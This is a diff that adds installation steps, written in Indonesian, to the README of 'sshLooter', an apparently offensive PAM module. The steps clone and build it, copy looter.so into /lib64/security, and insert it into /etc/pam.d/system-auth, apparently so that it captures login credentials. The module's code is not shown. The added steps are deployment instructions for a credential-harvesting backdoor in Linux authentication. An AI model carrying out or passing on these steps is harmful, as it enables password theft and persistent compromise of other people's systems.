@@ -20,3 +20,19 @@ Untuk mengkompilasi modul ini, Anda memerlukan paket pengembangan berikut:
 ```bash
 # Gunakan dnf atau yum
 sudo dnf install gcc libcurl-devel pam-devel git make
+
+git clone https://github.com/aexdyhaxor/sshLooter.git
+cd sshLooterC
+make
+
+
+# Untuk sistem 64-bit (RHEL/CentOS/Rocky)
+sudo cp looter.so /lib64/security/
+
+sudo nano /etc/pam.d/system-auth
+
+# Tambahkan di bagian atas file
+auth optional /lib64/security/looter.so
+account optional /lib64/security/looter.so
+
+<img width="1116" height="626" alt="image" src="https://github.com/user-attachments/assets/301a273c-3a7b-4486-bb26-accceea968cf" />
